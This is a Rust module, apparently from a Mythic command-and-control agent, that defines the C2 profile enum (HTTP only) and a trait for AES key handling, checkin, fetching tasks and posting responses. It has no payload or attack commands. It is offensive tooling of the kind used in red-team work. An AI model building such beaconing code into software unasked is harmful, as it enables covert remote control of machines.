use serde::{Deserialize, Serialize};

use crate::MythicResult;

// #[cfg(feature = "http")]
pub mod http;
// #[cfg(feature = "websocket")]
// pub mod websocket;
//

// 定义枚举，包含所有可能的 C2 变体
#[derive(Debug, Serialize, Deserialize)]
pub enum MythicC2 {
    // #[cfg(feature = "http")]
    #[serde(rename = "http")]
    Http(http::Http),
    // 未来增加：#[cfg(feature = "websocket")] WebSocket(websocket::WebSocket),
}

pub trait C2Trait {
    fn get_aes_psk(&self) -> [u8; 32];
    fn set_aes_psk(&mut self, psk: &str);
    fn encrypted_exchange_check(&self) -> bool;
    fn checkin(&self, packed: &str) -> MythicResult<String>;
    fn get_tasking(&self, packed: &str) -> MythicResult<String>;
    fn post_response(&self, packed: &str) -> MythicResult<String>;
}

macro_rules! impl_c2_trait {
    ($($variant:ident),+ $(,)?) => {
        impl MythicC2 {
            pub fn get_aes_psk(&self) -> [u8; 32] {
                match self {
                    $(Self::$variant(inner) => inner.get_aes_psk()),*
                }
            }
            pub fn set_aes_psk(&mut self, psk: &str) {
                match self {
                    $(Self::$variant(inner) => inner.set_aes_psk(psk)),*
                }
            }
            pub fn encrypted_exchange_check(&self) -> bool {
                match self {
                    $(Self::$variant(inner) => inner.encrypted_exchange_check()),*
                }
            }
            pub fn checkin(&self, packed: &str) -> MythicResult<String> {
                match self {
                    $(Self::$variant(inner) => inner.checkin(packed)),*
                }
            }
            pub fn get_tasking(&self, packed: &str) -> MythicResult<String> {
                match self {
                    $(Self::$variant(inner) => inner.get_tasking(packed)),*
                }
            }
            pub fn post_response(&self, packed: &str) -> MythicResult<String> {
                match self {
                    $(Self::$variant(inner) => inner.post_response(packed)),*
                }
            }
        }
    };
}

// #[cfg(feature = "http")]
impl_c2_trait!(Http);
